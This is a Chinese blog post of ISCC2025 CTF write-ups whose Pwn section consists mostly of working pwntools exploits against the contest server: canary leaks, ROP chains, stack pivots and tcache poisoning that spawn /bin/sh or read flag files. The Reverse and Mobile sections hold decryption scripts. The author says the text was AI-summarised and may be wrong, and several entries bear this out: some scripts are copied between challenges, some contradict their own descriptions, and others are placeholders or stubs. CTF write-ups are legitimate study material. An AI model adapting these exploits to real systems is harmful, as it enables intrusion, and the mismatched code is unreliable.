---
title: ISCC2025WriteUp
date: 2025-05-30 12:15:00
tags: [ctf,ISCC]
---
# ISCC2025 CTF WriteUp 汇总

本文记载了部分ISCC2025的题解，主要是个人赛时做出来的内容，也有部分内容是赛后得到的。内容因为过长经过AI总结，可能存在差错，并不代表个人真实WriteUp，仅供参考学习。

<!--more-->

## Pwn 类别

### book_manager

**解题思路：**

1. **连接目标服务器**：使用 remote() 函数连接到目标服务器的指定 IP 和端口。
2. **定义目标地址**：包括 flag 字符串的地址、加载函数地址、以及关键的 ROP gadget 地址（如 pop_rdi_ret 和 ret）。
3. **添加书籍函数封装**：简化后续代码调用，用于填充堆栈和构造恶意输入。
4. **泄露 canary 值**：利用搜索名称功能，通过缓冲区溢出泄露栈中的 canary 值。
5. **构造 ROP 链**：使用泄露的 canary 值和 ROP gadget 构造 ROP 链，调用加载函数读取 `/flag` 文件内容。
6. **填充书籍**：添加多个书籍填充堆栈，为后续的栈溢出攻击做准备。
7. **添加包含 ROP 链的书籍**：构造特殊的书籍，使其作者字段包含 ROP 链。
8. **触发栈溢出**：使用显示功能选择包含 ROP 链的书籍，触发栈溢出，执行 ROP 链。
9. **获取 flag**：执行 ROP 链后，读取返回的 flag 并打印。

**关键代码：**

```markdown
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

def exploit():
    io = remote('101.200.155.151', 23000)
    log.info("开始利用...")

    # 定义地址
    flag_addr = 0x4e9b2d
    load_func = 0x40340C
    pop_rdi_ret = 0x0000000000401a42
    ret = 0x0000000000401a43

    # 添加书籍函数
    def add_book(title, author, publisher):
        io.sendlineafter(b'>', b'1')
        io.sendafter(b'Title', title)
        io.sendafter(b'Author', author)
        io.sendafter(b'Publisher', publisher)
        log.debug(f"添加书籍: {title[:10]}...")

    # 泄露 canary
    log.info("尝试泄露canary...")
    io.sendlineafter(b'>', b'4')
    io.sendlineafter(b'choose', b'2')
    io.sendafter(b'name', b'a' * 0x28)
    io.recvuntil(b'a' * 0x28 + b'\n')
    canary_data = io.recv(7)
    canary = u64(canary_data.ljust(8, b'\x00')) << 8
    log.success(f"成功泄露canary: 0x{canary:x}")

    # 构造 ROP 链
    log.info("构造 ROP 链...")
    payload = flat([
        canary, 0, ret,
        pop_rdi_ret, flag_addr,
        load_func
    ])

    # 添加填充书籍
    log.info("添加填充书籍...")
    for _ in range(8):
        add_book(b'a' * 50, b'a' * 30, b'a' * 40)
    add_book(b'a' * 12, b'a' * 1, b'a' * 3)

    # 添加包含 ROP 链的书籍
    log.info("添加包含 ROP 链的书籍...")
    add_book(payload, b'b' * 20 + b'\x00/flag\x00\x00\x00', b'c' * 40)

    # 触发栈溢出
    log.info("触发栈溢出漏洞...")
    io.sendlineafter(b'>', b'6')
    io.sendlineafter(b'>', b'5')

    # 获取 flag
    log.info("等待接收 flag...")
    flag = io.recvline()
    log.success(f"获取到 Flag: {flag}")
    io.interactive()

if __name__ == "__main__":
    exploit()
```

### call

**解题思路：**

1. **信息收集**：确定目标程序运行的 IP 和端口，以及本地提供的程序和 libc 库文件。
2. **漏洞分析**：发现程序存在缓冲区大小与输入大小不匹配的漏洞，可能导致覆盖返回地址。
3. **泄露 libc 地址**：构造 ROP 链调用 `write` 函数，输出 `write` 函数的 GOT 表项地址，从而泄露 libc 的基地址。
4. **计算关键地址**：根据泄露的 `write` 地址计算 libc 基地址，进而确定 `system` 和 `/bin/sh` 的地址。
5. **构造 ROP 链**：利用泄露的 libc 基地址，构造 ROP 链调用 `system("/bin/sh")` 以获取 shell。

**关键代码：**

```python
from pwn import *

context.log_level = 'debug'

def exploit():
    p = remote('101.200.155.151', 12100)
    elf = ELF('./call')
    libc = ELF('./libc6_2.31-0ubuntu9.17_amd64.so')

    # 定义关键地址和 gadget
    ret_addr = 0x40101a
    pop_rdi = 0x401273
    pop_rsi_r15 = 0x401271
    main_addr = elf.symbols['main']
    write_plt = elf.plt['write']
    write_got = elf.got['write']

    # 构造泄露 write 地址的 payload
    payload1 = b'a' * 0x68 + p64(pop_rdi) + p64(1) + p64(pop_rsi_r15) + p64(write_got) + p64(8) + p64(write_plt) + p64(main_addr)
    p.sendlineafter('is\n', payload1)

    # 接收并解析泄露的 write 地址
    write_addr = u64(p.recv(6).ljust(8, b'\x00'))
    log.success(f"Leaked write address: {hex(write_addr)}")

    # 计算 libc 基地址
    libc_base = write_addr - libc.symbols['write']
    log.success(f"libc base address: {hex(libc_base)}")

    # 计算 system 和 /bin/sh 的地址
    system_addr = libc_base + libc.symbols['system']
    binsh_addr = libc_base + next(libc.search(b'/bin/sh'))

    # 构造获取 shell 的 ROP 链
    payload2 = b'a' * 0x68 + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
    p.sendlineafter('is\n', payload2)

    p.interactive()

if __name__ == "__main__":
    exploit()
```

### Dilemma

**解题思路：**

1. **连接远程服务**：使用 remote() 函数连接到目标服务器。
2. **泄露 canary 和 libc 地址**：通过格式化字符串漏洞泄露堆栈中的 canary 值以及 `__libc_start_main` 的地址。
3. **计算 libc 基地址**：根据 `__libc_start_main` 的偏移量计算 libc 的基地址。
4. **栈迁移攻击**：利用 `func_0` 中的缓冲区溢出漏洞，将控制流迁移到 bss 段。
5. **构造 ROP 链**：在 bss 段中写入 ROP 链，依次调用 `open`、`read` 和 `write` 函数读取并输出 flag 文件内容。

**关键代码：**

```python
from pwn import *

context(arch='amd64', os='linux')

def exploit():
    p = remote('101.200.155.151', 12500)
    elf = ELF('./pwn')
    libc = ELF('./libc.so.6')

    # 定义关键地址和 gadget
    pop_rdi = 0x40119a
    ret = 0x40101a
    bss_base = 0x404000
    target_bss = bss_base + 0x900
    pop_rsi_r15 = 0x40119c

    # 泄露 canary 和 libc 地址
    p.recvuntil("where are you go?\n")
    p.sendline("1")
    p.recvuntil("Enter you password:\n")

    payload = b'%39$p' + b'%11$p'
    p.sendline(payload)

    p.recvuntil("0x")
    libc_start_main_leak = int(p.recv(12), 16) - 128
    libc_base = libc_start_main_leak - libc.sym['__libc_start_main']
    log.success(f"libc base address: {hex(libc_base)}")

    p.recvuntil("0x")
    canary = int(p.recv(16), 16)
    log.success(f"canary: {hex(canary)}")

    # 进入 func_0 并进行栈迁移
    p.recvuntil("I will check your password:")
    p.send(b"a" * 8)

    p.recvuntil("where are you go?\n")
    p.sendline("2")

    # 构造栈迁移 payload
    stage1_payload = b'a' * 0x28 + p64(canary) + p64(target_bss) + p64(0x4011C9)
    p.send(stage1_payload)

    # 等待栈迁移完成
    p.recvuntil(b"a" * 0x28)

    # 计算关键函数地址
    pop_rdx_r12 = libc_base + 0x11f2e7
    libc_open = libc_base + libc.sym['open']
    libc_read = libc_base + libc.sym['read']
    libc_write = libc_base + libc.sym['write']

    # 构造完整 ROP 链
    flag_filename = b'./flag.txt'
    stage2_payload = flag_filename.ljust(0x28, b'\x00')
    stage2_payload += p64(canary)
    stage2_payload += p64(0)

    # 调用 open 打开 flag 文件
    stage2_payload += p64(pop_rdi) + p64(target_bss)
    stage2_payload += p64(pop_rsi_r15) + p64(0) + p64(0)
    stage2_payload += p64(libc_open)

    # 调用 read 读取 flag 内容
    stage2_payload += p64(pop_rdi) + p64(3)
    stage2_payload += p64(pop_rsi_r15) + p64(target_bss + 0x200) + p64(0)
    stage2_payload += p64(pop_rdx_r12) + p64(0x50) + p64(0)
    stage2_payload += p64(libc_read)

    # 调用 write 输出 flag 内容
    stage2_payload += p64(pop_rdi) + p64(1)
    stage2_payload += p64(pop_rsi_r15) + p64(target_bss + 0x200) + p64(0)
    stage2_payload += p64(pop_rdx_r12) + p64(0x50) + p64(0)
    stage2_payload += p64(libc_write)

    p.send(stage2_payload)
    p.interactive()

if __name__ == "__main__":
    exploit()
```

### Enc++

**解题思路：**

1. **分析加密流程**：通过逆向分析发现程序使用 AES 加密，并且提取了密钥和初始向量。
2. **泄露 canary 值**：利用格式化字符串漏洞读取栈上的 canary 值。
3. **触发执行流劫持**：修改全局变量的值进入存在缓冲区溢出的函数。
4. **构造 ROP 链**：利用 canary 值和 ROP gadget 构造 ROP 链，调用 `execve("/bin/sh", 0, 0)`。

**关键代码：**

```python
from pwn import *
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from base64 import b64encode

context.arch = 'amd64'

KEY = b"aewfdefsebrfcyiseygfeaisfygaseiw"
IV = b"iscc20250ca81aff"

def AESencrypt(message):
    backend = default_backend()
    cipher = Cipher(algorithms.AES(KEY), modes.CBC(IV), backend=backend)
    encryptor = cipher.encryptor()
    return encryptor.update(message) + encryptor.finalize()

def exploit():
    p = remote('101.200.155.151', 21000)
    elf = ELF('./pwn')

    # 泄露 canary
    p.recvuntil(b'date:')
    p.sendline(b64encode(KEY + IV + AESencrypt(b'%15$p!')))
    canary = eval(p.recvuntil(b'!', drop=True))
    log.success(f"Canary: {hex(canary)}")

    # 触发漏洞函数
    p.sendline(b64encode(KEY + IV + AESencrypt(b'%c%7$n')))

    # 构造 ROP 链
    rop = ROP(elf)
    rop.raw([
        canary, canary, canary, canary, canary, canary, 0,
        0x0000000000411dc6, 59,
        0x000000000040788b, 0x7C70C2,
        0x000000000040797b, 0,
        0x00000000004bc453, 0,
        0x00000000004c2e22
    ])

    p.sendline(rop.chain())
    p.interactive()

if __name__ == "__main__":
    exploit()
```

### Fufu

**解题思路：**

1. **信息收集**：确定目标程序运行的 IP 和端口。
2. **漏洞分析**：发现程序存在格式化字符串漏洞和栈溢出漏洞。
3. **泄露 canary 和 libc 地址**：利用格式化字符串漏洞泄露栈上的 canary 值和 `puts` 函数的 GOT 地址。
4. **计算关键地址**：根据泄露的 `puts` 地址计算 libc 的基地址。
5. **构造 ROP 链**：利用泄露的 libc 基地址，构造 ROP 链调用 `system("/bin/sh")` 以获取 shell。

**关键代码：**

```python
from pwn import *

context.log_level = 'debug'

def exploit():
    p = remote('101.200.155.151', 12600)
    elf = ELF('./call')
    libc = ELF('./libc6_2.31-0ubuntu9.17_amd64.so')

    # 定义关键地址和 gadget
    ret_addr = 0x40101a
    pop_rdi = 0x401273
    pop_rsi_r15 = 0x401271
    main_addr = elf.symbols['main']
    write_plt = elf.plt['write']
    write_got = elf.got['write']

    # 构造泄露 write 地址的 payload
    payload1 = b'a' * 0x68 + p64(pop_rdi) + p64(1) + p64(pop_rsi_r15) + p64(write_got) + p64(8) + p64(write_plt) + p64(main_addr)
    p.sendlineafter('is\n', payload1)

    # 接收并解析泄露的 write 地址
    write_addr = u64(p.recv(6).ljust(8, b'\x00'))
    log.success(f"Leaked write address: {hex(write_addr)}")

    # 计算 libc 基地址
    libc_base = write_addr - libc.symbols['write']
    log.success(f"libc base address: {hex(libc_base)}")

    # 计算 system 和 /bin/sh 的地址
    system_addr = libc_base + libc.symbols['system']
    binsh_addr = libc_base + next(libc.search(b'/bin/sh'))

    # 构造获取 shell 的 ROP 链
    payload2 = b'a' * 0x68 + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
    p.sendlineafter('is\n', payload2)

    p.interactive()

if __name__ == "__main__":
    exploit()
```

### mini pwn

**解题思路：**

1. **连接远程服务**：使用 remote() 函数连接到目标服务器。
2. **构造虚拟机指令**：构造特定的虚拟机指令序列，覆盖虚拟机状态存储区域。
3. **泄露 canary 和 libc 地址**：通过指令泄露 canary 值和 libc 地址。
4. **构造 ROP 链**：利用泄露的信息构造 ROP 链，调用 `execve("/bin/sh", 0, 0)`。

**关键代码：**

```python
from pwn import *

context(arch='amd64', os='linux')

def exploit():
    p = remote('101.200.155.151', 24000)

    code = (
        p8(0x02) + p8(6) + p8(0x01) + p8(1) + p8(0x01) + p8(3) + p8(0x01) + p8(0) +
        p8(0x02) + p8(6) + p8(0x01) + p8(2) +
        (p8(0x07) + p8(2)) * 0x3f6 +
        p8(0x03) + p8(0x08) + p8(3) + p8(0x08) + p8(3) +
        p8(0x07) + p8(1) + p8(0x07) + p8(1) + p8(0x07) + p8(1) + p8(0x05)
    )
    stack = p64(0x10) + p64(59) + b'/bin/sh\x00'

    try:
        p.sendline(stack)
        sleep(1)
        p.sendline(code)
        sleep(1)

        p.sendline(b'cat flag.txt')
        p.interactive()
    except EOFError as e:
        print(f"EOFError occurred: {e}")
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        p.close()

if __name__ == "__main__":
    exploit()
```

### mutilsumi

**解题思路：**

1. **分析程序功能**：程序通过输入用户数据创建和管理书籍。
2. **发现漏洞**：存在缓冲区溢出漏洞，允许用户输入超过缓冲区大小的数据。
3. **泄露 canary**：利用搜索功能，通过缓冲区溢出泄露栈中的 canary 值。
4. **构造 ROP 链**：使用泄露的 canary 值和 ROP gadget 构造 ROP 链，调用 `execve("/bin/sh", 0, 0)`。
5. **堆喷射**：通过多次添加书籍填充堆栈，为后续的栈溢出攻击做准备。
6. **触发栈溢出**：使用显示功能选择包含 ROP 链的书籍，触发栈溢出，执行 ROP 链。

**关键代码：**

```python
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

def exploit():
    p = remote('101.200.155.151', 23000)
    log.info("开始利用...")

    # 定义目标地址
    flag_addr = 0x4e9b2d
    load_func = 0x40340C
    pop_rdi_ret = 0x0000000000401a42
    ret = 0x0000000000401a43

    # 添加书籍函数封装
    def add_book(title, author, publisher):
        p.sendlineafter(b'>', b'1')
        p.sendafter(b'Title', title)
        p.sendafter(b'Author', author)
        p.sendafter(b'Publisher', publisher)
        log.debug(f"添加书籍: {title[:10]}...")

    # 泄露 canary
    log.info("尝试泄露canary...")
    p.sendlineafter(b'>', b'4')
    p.sendlineafter(b'choose', b'2')
    p.sendafter(b'name', b'a' * 0x28)
    p.recvuntil(b'a' * 0x28 + b'\n')
    canary_data = p.recv(7)
    canary = u64(canary_data.ljust(8, b'\x00')) << 8
    log.success(f"成功泄露canary: 0x{canary:x}")

    # 构造 ROP 链
    log.info("构造 ROP 链...")
    payload = flat([
        canary, 0, ret,
        pop_rdi_ret, flag_addr,
        load_func
    ])

    # 添加填充书籍
    log.info("添加填充书籍...")
    for _ in range(8):
        add_book(b'a' * 50, b'a' * 30, b'a' * 40)
    add_book(b'a' * 12, b'a' * 1, b'a' * 3)

    # 添加包含 ROP 链的书籍
    log.info("添加包含 ROP 链的书籍...")
    add_book(payload, b'b' * 20 + b'\x00/flag\x00\x00\x00', b'c' * 40)

    # 触发栈溢出
    log.info("触发栈溢出漏洞...")
    p.sendlineafter(b'>', b'6')
    p.sendlineafter(b'>', b'5')

    # 获取 flag
    log.info("等待接收 flag...")
    flag = p.recvline()
    log.success(f"获取到 Flag: {flag}")
    p.interactive()

if __name__ == "__main__":
    exploit()
```

### program

**解题思路：**

1. **泄露 libc 地址**：通过连续创建和释放堆块，利用 tcache 泄露 main_arena 地址，进而计算 libc 基地址。
2. **重建内存布局**：通过特定顺序的堆操作，构造重叠堆块，利用 tcache 的 FILO 特性制造多指针指向同一内存区域。
3. **劫持内存指针**：通过修改 tcache 链表的 fd 指针，将目标地址 `__free_hook` 插入分配链。
4. **获取特权内存**：通过三次连续分配操作，使分配器返回 `__free_hook` 的存储位置，实现内存写入权限获取。
5. **触发命令执行**：向 `__free_hook` 写入 `system` 函数地址，同时在可控堆块中植入 `/bin/sh` 命令字符串，触发删除操作时执行 `system("/bin/sh")`。

**关键代码：**

```python
from pwn import *

context(arch='amd64', os='linux')

libc = ELF('./libc-2.31.so')
conn = remote('101.200.155.151', 12300)

def create_entry(idx, sz):
    conn.sendlineafter(b'> ', b'1')
    conn.sendlineafter(b'Index: ', str(idx).encode())
    conn.sendlineafter(b'Size: ', str(sz).encode())

def remove_entry(idx):
    conn.sendlineafter(b'> ', b'2')
    conn.sendlineafter(b'Index: ', str(idx).encode())

def modify_entry(idx, sz, data):
    conn.sendlineafter(b'> ', b'3')
    conn.sendlineafter(b'Index: ', str(idx).encode())
    conn.sendlineafter(b'Length: ', str(sz).encode())
    conn.sendafter(b'Content: ', data)

def display_entry(idx):
    conn.sendlineafter(b'> ', b'4')
    conn.sendlineafter(b'Index: ', str(idx).encode())

# 阶段1：泄露libc地址
[create_entry(i, 512) for i in range(9)]
[remove_entry(i) for i in range(7)]
remove_entry(7)  # 进入unsorted bin
display_entry(7)

leak = u64(conn.recv(6).ljust(8, b'\x00'))
libc.address = leak - 0x1ecbe0  # main_arena偏移量

# 阶段2：重建内存布局
[create_entry(i, 512) for i in range(8)]
[create_entry(i, 64) for i in range(9)]

# 构造重叠堆块
for k in range(2,9):
    remove_entry(k)
remove_entry(0)
remove_entry(1)
remove_entry(0)  # 形成循环引用

# 阶段3：劫持内存指针
[create_entry(k, 64) for k in range(2,9)]
create_entry(2, 64)
modify_entry(2, 22, p64(libc.sym['__free_hook']))

# 获取目标地址写入权限
create_entry(0, 64)
create_entry(0, 64)
create_entry(0, 64)
modify_entry(0, 32, p64(libc.sym['system']))

# 阶段4：触发命令执行
modify_entry(3, 32, b'/bin/sh\0')
remove_entry(3)  # 转换执行流

conn.interactive()
```

### vm_pwn

**解题思路：**

1. **连接远程服务**：使用 remote() 函数连接到目标服务器。
2. **定义指令和 gadget**：包括加载立即数、间接加载、存储、移动寄存器、推入和弹出栈等指令。
3. **构造 ROP 链**：利用泄露的 libc 地址，调用 `open`、`read` 和 `write` 函数读取并输出 flag 文件内容。

**关键代码：**

```python
from pwn import *
import struct

context(arch='amd64', os='linux', log_level='debug')

file = "./pwn"
libc_path = "./libc.so.6"

elf = ELF(file, False)
libc = ELF(libc_path, False)

p = remote("101.200.155.151", 20000)

def load_imm(reg, imm):
    return struct.pack("<bbQ", 0, reg, imm)

def load_indirect(src_reg, dst_reg):
    return struct.pack("<bbb", 1, src_reg, dst_reg)

def store_indirect(src_reg, dst_reg):
    return struct.pack("<bbb", 2, src_reg, dst_reg)

def mov_reg(src_reg, dst_reg):
    return struct.pack("<bbb", 3, src_reg, dst_reg)

def push(reg_index):
    return struct.pack("<bb", 4, reg_index)

def pop(reg_index):
    return struct.pack("<bb", 5, reg_index)

def func_call(reg_index):
    return struct.pack("<bb", 6, reg_index)

def exit_vm():
    return struct.pack("<b", 8)

def add_imm(reg, imm):
    return struct.pack("<bbQ", 0xA, reg, imm)

def sub_imm(reg, imm):
    return struct.pack("<bbQ", 0xB, reg, imm)

payload = b""
payload += load_indirect(-11, 1)       # Load a libc address into reg1
payload += sub_imm(1, 0x50)            # Adjust the address
payload += load_indirect(1, 0)         # Load the value at that address into reg0
payload += sub_imm(0, libc.sym['malloc'])  # Subtract malloc offset to get libc base
payload += mov_reg(0, 2)               # Move libc base to reg2
payload += add_imm(2, libc.sym['system'])  # Add system offset to reg2
payload += add_imm(0, next(libc.search(b'/bin/sh\x00')))  # Set reg0 to "/bin/sh" string
payload += func_call(2)                # Call system("/bin/sh")
payload += exit_vm()                   # Exit the VM

p.recvuntil(b"Enter bytecode: ")
p.send(payload)  # Using send() instead of sendline()

p.interactive()
```

## Reverse 类别

### CrackMe

**解题思路：**

1. **提取加密数据**：使用 IDA 或其他逆向工具提取程序中的加密字符串。
2. **提取解密数组**：找到程序中的解密数组。
3. **异或操作**：将加密数据与解密数组进行逐项异或操作。
4. **字符映射转换**：根据程序中的映射表，将中间解密结果转换为最终字符。

**关键代码：**

```python
from ida_bytes import *

# 定义可打印字符集
printable = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&'()*+,-./:;<=>?@[\]^_`{|}~"

# 定义字符映射表
table = [
    0x0074, 0x0073, 0x0076, 0x0075, 0x0078, 0x0077, 0x007A, 0x0079, 0x0062, 0x0061, 0x0020,
    0x0023, 0x0022, 0x0025, 0x0024, 0x0027, 0x0026, 0x0029, 0x0028, 0x002B, 0x002A, 0x002D,
    0x002C, 0x002F, 0x002E, 0x0031, 0x0030, 0x0033, 0x0032, 0x0035, 0x0034, 0x0037, 0x0036,
    0x0039, 0x0038, 0x003B, 0x003A, 0x003D, 0x003C, 0x003F, 0x003E, 0x0062, 0x0060, 0x0065, 0x0064
]

# 提取加密数据
enc = list(get_bytes(0x0140010010, 42))

# 定义解密数组
get = [
    0x67, 0xB8, 0x4F, 0x47, 0xAC, 0x72, 0x6D, 0xA2, 0x97, 0x13,
    0x4E, 0x46, 0xDE, 0xF0, 0x31, 0x81, 0xC5, 0xE6, 0x92, 0xEE,
    0x56, 0x9A, 0x52, 0x28, 0x0D, 0x6B, 0xF6, 0xE8, 0xD8, 0x24,
    0x82, 0x3F, 0xAB, 0x15, 0x3E, 0x17, 0xBD, 0x91, 0x83, 0xFE,
    0x7A, 0x74, 0x64, 0x4B, 0x1B, 0xAB, 0xE0, 0xB6
]

# 对加密数据进行异或操作
for i in range(len(enc)):
    enc[i] ^= get[i] ^ 0x73

# 根据映射表将数值转换为字符
for i in range(0, len(enc), 2):
    if enc[i] in table:
        print(printable[table.index(enc[i])], end="")
```

### HolyGrail

**解题思路：**

1. **动态分析**：使用 jadx 工具对目标程序进行逆向分析，精准定位至主函数所在路径。
2. **提取密文**：从程序中提取加密的密文信息。
3. **动态调试**：使用动态调试工具如 x64dbg 或 IDA Pro，跟踪加密函数的调用过程。
4. **分析加密逻辑**：发现程序使用了维吉尼亚（Vigenère）加密算法，并提取密钥。
5. **构建解密脚本**：使用 Frida 工具创建钩子函数，拦截加密函数调用，记录参数和返回值。
6. **自定义编码方案**：根据程序中的自定义编码方案，将解密后的数据转换为可读字符。

**关键代码：**

```python
import itertools
import hashlib
from tqdm import tqdm

# 定义可打印字符集
printable = r"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&'()*+,-./:;<=>?@[\]^_`{|}~"

# 编码映射字符串
get = "..."  # 很长的十六进制字符串

# 解析映射
data = []
while get != "":
    if get[2:4] == "21":
        data.append(get[:4].lower())
        get = get[4:]
    else:
        data.append(get[:2].lower())
        get = get[2:]

# 维吉尼亚解密函数
def vigenere_decrypt(ciphertext, key):
    decrypted = []
    key = key.lower()
    key_length = len(key)
    key_index = 0

    for char in ciphertext:
        if char.isalpha():
            offset = ord('a') if char.islower() else ord('A')
            k = ord(key[key_index % key_length]) - ord('a')
            decrypted_char = chr((ord(char) - offset - k) % 26 + offset)
            decrypted.append(decrypted_char)
            key_index += 1
        else:
            decrypted.append(char)
    return ''.join(decrypted)

# 主解密函数
def decrypt(enc):
    encs = []
    while enc != "":
        if enc[2:4] == "21":
            encs.append(enc[:4])
            enc = enc[4:]
        else:
            encs.append(enc[:2])
            enc = enc[2:]

    get = ""
    for i in encs:
        get += printable[data.index(i)]

    key = "TheDaVinciCode"
    plaintext = vigenere_decrypt(get, key)
    print(plaintext)

# 调用解密函数
decrypt("1018444F1F5B5155602C5C411C4E")
```

### SecretGrid

**解题思路：**

1. **分析程序**：通过 IDA 或其他逆向工具分析程序，发现程序中存在一个 `printflag` 函数。
2. **定位密文**：在程序中找到加密的字符串存储位置。
3. **提取密文和密钥**：提取加密字符串和解密密钥。
4. **解密操作**：对加密字符串进行异或操作，并再次与 0x73 进行异或，获取中间解密结果。
5. **字符映射**：根据程序中的映射表，将中间解密结果转换为最终字符。

**关键代码：**

```python
from ida_bytes import *

# 定义可打印字符集
printable = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&'()*+,-./:;<=>?@[\]^_`{|}~"

# 定义字符映射表
table = [
    0x0074, 0x0073, 0x0076, 0x0075, 0x0078, 0x0077, 0x007A, 0x0079, 0x0062, 0x0061, 0x0020,
    0x0023, 0x0022, 0x0025, 0x0024, 0x0027, 0x0026, 0x0029, 0x0028, 0x002B, 0x002A, 0x002D,
    0x002C, 0x002F, 0x002E, 0x0031, 0x0030, 0x0033, 0x0032, 0x0035, 0x0034, 0x0037, 0x0036,
    0x0039, 0x0038, 0x003B, 0x003A, 0x003D, 0x003C, 0x003F, 0x003E, 0x0062, 0x0060, 0x0065, 0x0064
]

# 提取加密数据
enc = list(get_bytes(0x0140010010, 42))

# 定义解密数组
get = [
    0x67, 0xB8, 0x4F, 0x47, 0xAC, 0x72, 0x6D, 0xA2, 0x97, 0x13,
    0x4E, 0x46, 0xDE, 0xF0, 0x31, 0x81, 0xC5, 0xE6, 0x92, 0xEE,
    0x56, 0x9A, 0x52, 0x28, 0x0D, 0x6B, 0xF6, 0xE8, 0xD8, 0x24,
    0x82, 0x3F, 0xAB, 0x15, 0x3E, 0x17, 0xBD, 0x91, 0x83, 0xFE,
    0x7A, 0x74, 0x64, 0x4B, 0x1B, 0xAB, 0xE0, 0xB6
]

# 对加密数据进行异或操作
for i in range(len(enc)):
    enc[i] ^= get[i] ^ 0x73

# 根据映射表将数值转换为字符
for i in range(0, len(enc), 2):
    if enc[i] in table:
        print(printable[table.index(enc[i])], end="")
```

### uglyCpp

**解题思路：**

1. **逆向分析**：使用 IDA 或其他逆向工具分析程序，提取出加密后的数据和解密密钥。
2. **异或操作**：将提取出的加密数据与密钥进行逐项异或操作。
3. **字符映射转换**：根据自定义的字符映射表，将异或后的结果转换为最终字符。

**关键代码：**

```python
v = [1402995999, -1804867724, -1684076187, -708415294, 1697943426, 704842934, 1657972338, -594299211, 63671599]
v = [i & 0xffffffff for i in v]
xor = [0x3ED6325B, 0xD709BF17, 0xE3F27E18, 0xA0870791, 0x0146D6F9, 0x7C6140FF, 0x10B69406, 0x94DDE0F6, 0x40B2BB6C]

for i in range(len(v)):
    v[i] ^= xor[i]

flag = "".join([chr(i) for i in v])
print(flag)

c_table = "5p6h7q8d9risbtjuevkwaxlyfzm0c1n2g3o4"
table = "abcdefghijklmnopqrstuvwxyz0123456789"

for i in table:
    print(flag[c_table.index(i)], end="")
```

## Mobile 类别

### Detective

**解题思路：**

1. **分析应用**：使用 jadx 工具对 APK 文件进行逆向分析，发现关键的 JNI 函数和本地库文件。
2. **定位密文**：在本地库文件中找到加密的 flag 数据。
3. **绕过保护机制**：通过修改 SO 文件中的调试检测函数，绕过调试尝试。
4. **动态分析**：使用 Unidbg 工具模拟应用运行环境，拦截关键函数调用，提取解密后的 flag。

**关键代码：**

```java
// 使用十六进制编辑器修补 SO 文件
// 将0x6C0B3252处的函数替换为NOP指令
// 原始字节：[原始字节]
// 修补后字节：00 BF 00 BF 00 BF (ARM Thumb NOP指令)

// Unidbg模板设置
public class VmobileEmu extends AbstractJNIEmulator {

    public static void main(String[] args) {
        VmobileEmu emulator = new VmobileEmu();
        emulator.setup();
        emulator.runTest();
    }

    private void setup() {
        AndroidEmulator emulator = AndroidEmulatorBuilder.for32Bit()
            .setProcessName("com.example.mobile")
            .build();

        Memory memory = emulator.getMemory();
        VM vm = emulator.createDalvikVM();

        new AndroidModule(emulator, vm).register(memory);

        DalvikModule dm = vm.loadLibrary("libvmobile", true);

        emulator.traceCode();
    }

    private void runTest() {
        // 使用正确的参数调用解密函数
        // ...

        // 提取并打印解密后的flag
    }
}
```

### GGAD

**解题思路：**

1. **分析应用结构**：使用 jadx 工具对 APK 文件进行逆向分析，识别出关键的加密逻辑。
2. **提取密文和密钥**：从程序中提取加密后的数据和密钥。
3. **修改 TEA 算法**：根据程序中的修改版 TEA 算法，手动实现解密过程。
4. **时间戳计算**：根据题目提示，计算出最大时间戳。
5. **解密获取 flag**：使用计算出的时间戳生成 S 盒，完成解密过程。

**关键代码：**

```c
#include <stdio.h>
#include <stdint.h>
#include <memory.h>
#include <time.h>

typedef enum {
    AES_CIPHER_128,
    AES_CIPHER_192,
    AES_CIPHER_256,
} AesCipherType;

int aesKeyBits[] = {
    128,
    192,
    256,
};

int aesRounds[] = {
    10,
    12,
    14,
};

int aesNk[] = {
    4,
    6,
    8,
};

int aesNb[] = {
    4,
    4,
    4,
};

static const uint32_t aesRcon[] = {
    0x01000000, 0x02000000, 0x04000000, 0x08000000, 0x10000000, 0x20000000,
    0x40000000, 0x80000000,
    0x1b000000, 0x36000000, 0x6c000000, 0xd8000000, 0xab000000, 0xed000000,
    0x9a000000
};

static const uint8_t aesSbox[256] = {
    213, 118, 6, 193, 4, 108, 215, 212, 233, 105, 110, 191, 153, 245, 99, 76, 94,
    214, 67, 58, 109, 65, 56, 194, 210, 70, 57, 172, 188, 156, 182, 250, 154, 13, 73, 230, 117, 202, 24, 71, 229, 79, 42, 253, 12, 48, 38, 163, 49, 32, 123, 217, 177, 59, 82, 116, 162, 36, 141, 93, 72, 44, 40, 186, 174, 89, 232, 26, 201, 134, 61, 23, 64, 140, 149, 17, 121, 206, 51, 45, 91, 157, 190, 242, 35, 175, 19, 204, 145, 139, 224, 228, 87, 237, 78, 5, 246, 33, 197, 114, 236, 10, 43, 160, 122, 247, 216, 75, 14, 240, 155, 178, 124, 100, 254, 167, 235, 196, 200, 0, 30, 227, 176, 165, 101, 127, 104, 68, 244, 126, 198, 161, 170, 248, 21, 218, 166, 187, 39, 66, 112, 179, 88, 138, 97, 220, 180, 8, 37, 28, 195, 96, 31, 92, 164, 25, 238, 53, 183, 146, 147, 46, 239, 208, 143, 249, 219, 136, 16, 132, 226, 3, 113, 74, 225, 18, 84, 115, 34, 171, 98, 203, 142, 52, 41, 95, 15, 62, 103, 221, 148, 231, 83, 168, 130, 102, 158, 69, 125, 2, 223, 152, 27, 209, 11, 159, 7, 144, 55, 243, 255, 181, 137, 60, 169, 120, 107, 54, 173, 135, 1, 9, 29, 85, 20, 211, 80, 77, 199, 189
};

static const uint8_t aesInvSbox[256] = {
    119, 246, 199, 171, 4, 95, 2, 232, 147, 247, 101, 230, 44, 33, 108, 186,
